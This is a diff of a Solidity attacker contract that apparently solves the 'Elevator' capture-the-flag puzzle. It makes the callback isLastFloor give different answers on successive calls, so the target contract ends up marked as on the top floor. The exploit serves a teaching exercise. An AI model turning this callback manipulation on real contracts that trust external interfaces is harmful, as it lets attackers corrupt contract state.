@@ -21,21 +21,22 @@ contract Elevator {
 
 interface IElevator {
     function goTo(uint256 _floor) external;
+    function floor() external view returns (uint256);
 }
 
 contract Top {
-    uint256 counter = 0;
+
+    address elevator;
 
     function attack(address _addr) external {
-        IElevator(_addr).goTo(10);
+        elevator = _addr;
+        IElevator(elevator).goTo(10);
     }
 
     function isLastFloor(uint256 _floor) external returns (bool) {
-        if (counter == 0) {
-            counter++;
+        if (IElevator(elevator).floor() == 0) {
             return false;
-        } else {
-            return true;
         }
+        return true;
     }
 }
